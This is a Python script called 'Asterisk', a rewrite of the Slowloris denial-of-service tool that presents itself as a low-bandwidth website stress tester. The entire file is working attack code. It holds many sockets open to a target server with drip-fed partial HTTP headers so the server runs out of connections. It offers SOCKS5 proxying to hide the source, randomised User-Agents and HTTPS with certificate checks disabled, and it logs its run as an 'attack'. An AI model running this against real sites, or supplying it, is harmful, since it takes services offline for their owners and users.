#!/usr/bin/env python3
"""
Asterisk: Low bandwidth stress test tool for websites
Originally based on Slowloris, rewritten and maintained by Jaydatt Khodave
"""

import argparse
import logging
import random
import socket
import sys
import time

# Argument parser
parser = argparse.ArgumentParser(
    description="Asterisk: Low bandwidth stress test tool for websites"
)
parser.add_argument("host", nargs="?", help="Host to perform stress test on")
parser.add_argument("-p", "--port", default=80, help="Port of webserver", type=int)
parser.add_argument("-s", "--sockets", default=150, help="Number of sockets to use", type=int)
parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose logging")
parser.add_argument("-ua", "--randuseragents", action="store_true", help="Randomize User-Agent headers")
parser.add_argument("-x", "--useproxy", action="store_true", help="Use SOCKS5 proxy")
parser.add_argument("--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host")
parser.add_argument("--proxy-port", default=8080, type=int, help="SOCKS5 proxy port")
parser.add_argument("--https", action="store_true", help="Use HTTPS")
parser.add_argument("--sleeptime", default=15, type=int, help="Sleep time between headers (seconds)")

args = parser.parse_args()

# Exit early if no host provided
if len(sys.argv) <= 1 or not args.host:
    parser.print_help()
    sys.exit(1)

# SOCKS5 Proxy Setup
if args.useproxy:
    try:
        import socks
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port)
        socket.socket = socks.socksocket
        logging.info("Using SOCKS5 proxy...")
    except ImportError:
        print("Error: PySocks not installed. Install it with `pip install pysocks`.")
        sys.exit(1)

# Logging Setup
logging.basicConfig(
    format="[%(asctime)s] %(message)s",
    datefmt="%d-%m-%Y %H:%M:%S",
    level=logging.DEBUG if args.verbose else logging.INFO,
)

# Socket methods
def send_line(self, line):
    self.send((f"{line}\r\n").encode("utf-8"))

def send_header(self, name, value):
    self.send_line(f"{name}: {value}")

# HTTPS Patch
if args.https:
    import ssl
    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)

setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)

# User Agents list
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
]

list_of_sockets = []

def init_socket(ip: str):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    try:
        if args.https:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=args.host)
        s.connect((ip, args.port))
        s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
        ua = random.choice(user_agents) if args.randuseragents else user_agents[0]
        s.send_header("User-Agent", ua)
        s.send_header("Accept-language", "en-US,en,q=0.5")
        return s
    except socket.error as e:
        logging.debug(f"Socket init failed: {e}")
        return None

def asterisk_iteration():
    logging.info("Sending keep-alive headers...")
    logging.info("Active sockets: %s", len(list_of_sockets))
    
    for s in list(list_of_sockets):
        try:
            s.send_header("X-a", random.randint(1, 5000))
        except socket.error:
            list_of_sockets.remove(s)

    diff = args.sockets - len(list_of_sockets)
    if diff > 0:
        logging.info("Replenishing with %s new sockets...", diff)
        for _ in range(diff):
            s = init_socket(args.host)
            if s:
                list_of_sockets.append(s)

def main():
    logging.info("Starting Asterisk attack on %s using %s sockets.", args.host, args.sockets)
    logging.info("Creating initial sockets...")
    for _ in range(args.sockets):
        try:
            s = init_socket(args.host)
            if s:
                list_of_sockets.append(s)
        except socket.error as e:
            logging.debug(f"Failed to create socket: {e}")
            break

    while True:
        try:
            asterisk_iteration()
        except (KeyboardInterrupt, SystemExit):
            logging.info("Asterisk stopped by user.")
            break
        except Exception as e:
            logging.debug(f"Unexpected error: {e}")
        logging.debug("Sleeping for %d seconds", args.sleeptime)
        time.sleep(args.sleeptime)

if __name__ == "__main__":
    main()
